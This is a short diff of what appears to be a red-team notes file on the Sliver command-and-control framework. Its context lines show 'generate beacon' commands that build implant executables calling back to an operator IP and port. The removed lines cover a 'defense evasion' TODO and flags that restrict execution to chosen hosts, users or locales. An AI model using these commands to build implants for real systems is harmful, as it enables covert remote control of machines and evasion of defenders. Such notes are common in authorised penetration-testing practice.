@@ -123,18 +123,6 @@ sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm | arm
 sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64]> -o solaris -f exe -s /path/to/directory
 ```
 
-TODO: Test these features for defense evasion.
-
-```
-  -X, --key-exchange       int       wg key-exchange port (default: 1337)
-  -w, --limit-datetime     string    limit execution to before datetime
-  -x, --limit-domainjoined           limit execution to domain joined machines
-  -F, --limit-fileexists   string    limit execution to hosts with this file in the filesystem
-  -z, --limit-hostname     string    limit execution to specified hostname
-  -L, --limit-locale       string    limit execution to hosts that match this locale
-  -y, --limit-username     string    limit execution to specified username
-```
-
 ### 4.1.3 - Profiles
 
 #### 4.1.3.1 - Help Menu
